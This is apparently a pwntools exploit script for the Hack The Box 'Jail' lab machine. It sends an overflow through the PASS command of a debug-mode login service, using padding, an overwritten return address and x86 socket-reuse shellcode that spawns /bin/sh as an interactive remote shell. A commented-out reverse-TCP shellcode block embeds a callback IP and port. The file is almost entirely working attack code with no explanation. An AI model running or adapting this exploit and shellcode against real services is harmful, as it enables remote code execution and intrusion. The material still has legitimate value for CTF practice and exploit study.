from pwn import *
# HTB jail
# set basic 
context(os='linux', arch='i386')
HOST, PORT = "10.10.10.34", 7411

# EIP overwrite
padding = 'A' * 28

# memory address
mem = p32(0xffffd610+32)

# shellcode reverse TCP 
#buf = ""
#buf += "\x68"
#buf += "\x7f\x00\x00\x01"  # <- IP Number "127.0.0.1"
#buf += "\x0A\x0A\x0E\x49"  # <- IP Number "10.10.14.73"
#buf += "\x5e\x66\x68"
#buf += "\xc8\x33"          # <- Port Number "51251"
#buf += "\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
#buf += "\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
#buf += "\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
#buf += "\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
#buf += "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
#buf += "\xeb\xce"


# shellcode socket reuse
buf = ""
buf += "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
buf += "\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
buf += "\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
buf += "\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
buf += "\x89\xe3\x31\xc9\xcd\x80"

# connecte to host
p = remote(HOST, PORT)

p.recvuntil("OK Ready. Send USER command.")
p.sendline("DEBUG")
p.recvuntil("OK DEBUG mode on.")
p.sendline("USER admin")
p.recvuntil("OK Send PASS command.")
p.sendline("PASS "+padding + mem +buf)
p.interactive()
